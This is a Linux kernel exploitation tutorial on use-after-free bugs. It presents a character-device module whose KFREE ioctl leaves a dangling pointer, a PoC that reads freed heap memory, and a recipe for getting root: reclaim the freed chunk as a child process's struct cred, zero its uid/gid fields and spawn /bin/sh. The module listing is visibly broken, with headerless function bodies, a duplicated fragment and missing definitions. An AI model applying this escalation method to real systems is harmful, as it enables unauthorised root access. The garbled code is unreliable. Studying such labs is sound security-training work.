06.Use-After-Free(UAF) (feat.struct cred)

Use-After-Free(UAF)​

  • Refer to first-fit (Use-After-Free).
CWE-416: Use After Free
  • https://cwe.mitre.org/data/definitions/416.html
  • https://www.cvedetails.com/cwe-details/416/cwe.html
  • https://www.cvedetails.com/vulnerability-list/cweid-416/vulnerabilities.html

kmalloc, kfree​

  • Before practicing kernel UAF, we examine kernel heap dynamic allocation functions:
    • kmalloc() and kfree() allocate and release heap memory in kernel space.
    • Additional memory allocation functions exist for specialized kernel needs.
  • kmalloc() parameters:
    • First parameter: Size of memory to allocate (in bytes).
    • Second parameter: Allocation flags (e.g. GFP_KERNEL for normal kernel RAM allocation).
kmalloc() function
void *kmalloc(size_t size, gfp_t flags);
  • kfree() parameters:
    • First parameter: Pointer returned by kmalloc().
kfree() function
void kfree(const void * objp);
Memory Management in Linux
  • https://www.kernel.org/doc/htmldocs/kernel-api/API-kmalloc.html
  • https://www.kernel.org/doc/htmldocs/kernel-api/API-kfree.html
  • https://www.kernel.org/doc/htmldocs/kernel-api/mm.html

Example​

Source code of module​

chardev_ioctl()​

  • KMALLOC case allocates kernel memory:
    • Memory size is passed from user space: info.size = (size_t)arg;
    • Allocated pointer is stored: info.buf = (char *)kmalloc(info.size, GFP_KERNEL);
  • KFREE case frees kernel memory:
    • If info.buf is non-NULL: kfree(info.buf);
Vulnerability
  • The vulnerability occurs in the KFREE handler:
    • After calling kfree(info.buf), the pointer info.buf is not set to NULL, leaving a dangling pointer (Use-After-Free).

chardev_write()​

  • If info.buf is non-NULL and info.size > count, copies data from user buffer into info.buf via copy_from_user().

chardev_read()​

  • If info.buf is non-NULL and info.size > count, copies data from info.buf to user buffer via copy_to_user().

static const unsigned int MINOR_BASE = 0;
static const unsigned int MINOR_NUM  = 1;
static unsigned int chardev_major;
static struct cdev chardev_cdev;
static struct class *chardev_class = NULL;
    
static int     chardev_open(struct inode *, struct file *);
static int     chardev_release(struct inode *, struct file *);
static ssize_t chardev_read(struct file *, char *, size_t, loff_t *);
static ssize_t chardev_write(struct file *, const char *, size_t, loff_t *);
static long chardev_ioctl(struct file *, unsigned int, unsigned long);
    
struct file_operations s_chardev_fops = {
    .open    = chardev_open,
    .release = chardev_release,
    .read    = chardev_read,
    .write   = chardev_write,
    .unlocked_ioctl = chardev_ioctl,
};
    
static int chardev_init(void)
{
    int alloc_ret = 0;
    int cdev_err = 0;
    int minor = 0;
    dev_t dev;
     
    printk("The chardev_init() function has been called.\n");
         
    alloc_ret = alloc_chrdev_region(&dev, MINOR_BASE, MINOR_NUM, DRIVER_NAME);
    if (alloc_ret != 0) {
        printk(KERN_ERR  "alloc_chrdev_region = %d\n", alloc_ret);
        return -1;
    }
    //Get the major number value in dev.
    chardev_major = MAJOR(dev);
    dev = MKDEV(chardev_major, MINOR_BASE);
     
    //initialize a cdev structure
    cdev_init(&chardev_cdev, &s_chardev_fops);
    chardev_cdev.owner = THIS_MODULE;
     
    //add a char device to the system
    cdev_err = cdev_add(&chardev_cdev, dev, MINOR_NUM);
    if (cdev_err != 0) {
        printk(KERN_ERR  "cdev_add = %d\n", alloc_ret);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }
     
    chardev_class = class_create(THIS_MODULE, "chardev");
    if (IS_ERR(chardev_class)) {
        printk(KERN_ERR  "class_create\n");
        cdev_del(&chardev_cdev);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }
     
    device_create(chardev_class, NULL, MKDEV(chardev_major, minor), NULL, "chardev%d", minor);
    return 0;
}
     
static void chardev_exit(void)
{
    int minor = 0;
    dev_t dev = MKDEV(chardev_major, MINOR_BASE);
         
    printk("The chardev_exit() function has been called.\n");
    
    device_destroy(chardev_class, MKDEV(chardev_major, minor));
     
    class_destroy(chardev_class);
    cdev_del(&chardev_cdev);
    unregister_chrdev_region(dev, MINOR_NUM);
}

{
    printk("The chardev_write() function has been called.");   
    if(info.buf){
        if(info.size > count){
            if(copy_from_user(info.buf, buf, count) != 0){
                return -EFAULT;
            }
        }
    }
    return count;
}

            }
        }
    }
    return count;
}
     
static long chardev_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    printk("The chardev_ioctl() function has been called.\n");
     
    switch (cmd) {
	case KMALLOC:
        if(!info.buf){
		    printk("Addresss of info.buf : %p\n",info.buf);
	        info.size = (size_t)arg;
		    info.buf = (char *)kmalloc(info.size, GFP_KERNEL);

		    if (!info.buf){
    		    printk("Error!\n");
		    }else{
		        printk("Addresss of info.buf : %p\n",info.buf);
		        printk("Success!\n");
		    }
        }
        break;
	case KFREE:
        if(info.buf){
	        printk("Call the kfree(). info.buf %p\n",info.buf);
            kfree(info.buf);
        }
        break;
    default:
        printk(KERN_WARNING "unsupported command %d\n", cmd); 
        return -EFAULT;
    }
    return 0;
}

Proof of Concept​

PoC code​

  • Test the UAF vulnerability:
    • Open /dev/chardev0.
    • Call ioctl(fd1, KMALLOC, 128) to allocate 128 bytes of heap.
    • Call ioctl(fd1, KFREE) to free the allocated heap chunk.
    • Call read(fd1, info, 127) to read memory from the freed heap chunk.
poc.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include "chardev.h"

#define HEAP_SIZE 128

int main()
{
    int fd1,i,j;
    char info[HEAP_SIZE];

 
    if ((fd1 = open("/dev/chardev0", O_RDWR)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }

    if (ioctl(fd1, KMALLOC, HEAP_SIZE) < 0){
        printf("Error : SET_DATA.\n");
    }

    ioctl(fd1, KFREE);

    memset(info, 0, HEAP_SIZE);
    read(fd1,info,HEAP_SIZE - 1);

    for (i = 0; i < 8; i++)
    {
        for (j = 0; j < 16; j++) printf("%02x ", info[i*16+j] & 0xff);
        printf(" | ");
        for (j = 0; j < 16; j++) printf("%c", info[i*16+j] & 0xff);
        printf("\n");
    }

    if (close(fd1) != 0){
        printf("Cannot close.\n");
    }

    return 0;
}

Exploit method​

  • Exploitation workflow via struct cred overwrite:
note
  • Allocate a kernel heap chunk equal to sizeof(struct cred) via KMALLOC.
  • Free the chunk via KFREE (creating a dangling pointer in info.buf).
  • Call fork() to create a child process.
    • Kernel allocates struct cred for the child process into the recently freed chunk (SLUB fastpath/first-fit reuse).
  • Write zeroes into the first 28 bytes of info.buf via chardev_write().
    • Overwrites uid, gid, suid, sgid, euid, egid, fsuid, fsgid to 0 (root).
  • The child process now possesses root credentials and spawns a root shell via system("/bin/sh").

Exploit code - 2​

Proof of Concept​

  • Exploiting cross-file-descriptor global state:
    • Because info.buf is a global variable in the module, open two file descriptors (fd1, fd2).
    • Allocate and free via fd1, close fd1, then access/overwrite the freed chunk via fd2.
